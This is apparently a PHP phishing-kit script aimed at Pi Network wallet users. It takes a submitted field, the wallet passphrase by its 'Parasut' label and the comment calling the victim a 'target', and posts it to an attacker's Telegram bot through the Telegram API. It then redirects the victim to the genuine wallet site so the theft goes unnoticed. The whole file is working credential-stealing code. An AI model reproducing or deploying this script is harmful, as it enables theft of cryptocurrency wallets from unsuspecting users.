<?php
session_start();
include "zendsdevbot.php";
//cek ip addres target
//$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

//mengirimkan data ke bot dengan $_POST
$content = $_POST['content'];

//menampilkan data ke bot
$message = "
──────────────
Pinetwork 🐟
─────────────
• Parasut : ".$content."
──────────────
";

function sendMessage($idtele, $message, $token)
{
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?parse_mode=markdown&chat_id=" . $idtele;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($idtele, $message, $token);
header('Location: https://wallet.pinet.com/');
?>